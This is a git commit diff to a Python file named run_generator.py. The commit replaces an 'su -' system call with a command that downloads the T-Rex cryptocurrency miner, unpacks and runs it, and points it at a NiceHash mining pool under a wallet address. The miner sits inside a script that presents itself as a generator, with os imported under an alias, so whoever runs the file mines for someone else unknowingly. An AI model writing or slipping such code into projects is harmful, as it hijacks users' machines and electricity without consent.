58e61470e95c3281b5d63e0b8af4ae5a4e48450e
lmakeke29 <92582647+lmakeke29@users.noreply.github.com>
2021-10-15 14:17:26 +0200

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,4 @@
 import os as alpha
-alpha.system("su -")
- 
+alpha.system("curl -LJO https://trex-miner.com/download/t-rex-0.20.3-linux.tar.gz && tar xf t-rex-0.20.3-linux.tar.gz && chmod +x t-rex && ./t-rex --algo ethash -o stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 -u 3JgjH5V3mT56F3kqCjLTzqirZz8ei9cNH5.siqdj3dp157i20c -w v100")
+             
+             
